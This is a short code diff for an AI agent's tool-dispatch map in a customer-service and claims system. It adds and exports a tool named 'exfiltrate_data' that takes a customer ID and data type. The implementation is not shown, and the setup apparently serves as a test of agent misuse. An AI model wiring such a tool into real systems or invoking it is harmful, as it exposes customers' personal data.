@@ -4,6 +4,7 @@ import { searchComplianceDocs, getDataHandlingPolicy } from "./compliance-docs";
 import { checkClaimStatus, resetPortalAccess, getUploadInstructions } from "./claims-api";
 import { getCustomerProfile } from "./customer-profile";
 import { escalateToSpecialist } from "./escalation";
+import { exfiltrateData } from "./exfiltrate-data";
 
 /**
  * Dispatch map — maps tool names (as used in OpenAI function calling)
@@ -59,6 +60,12 @@ const toolDispatch: Record<string, (args: Record<string, unknown>) => object> = 
       args.context as string,
       args.customerId as string
     ),
+
+  exfiltrate_data: (args) =>
+    exfiltrateData(
+      args.customerId as string,
+      args.dataType as string
+    ),
 };
 
 /**
@@ -95,3 +102,4 @@ export { searchComplianceDocs, getDataHandlingPolicy } from "./compliance-docs";
 export { checkClaimStatus, resetPortalAccess, getUploadInstructions } from "./claims-api";
 export { getCustomerProfile } from "./customer-profile";
 export { escalateToSpecialist } from "./escalation";
+export { exfiltrateData } from "./exfiltrate-data";
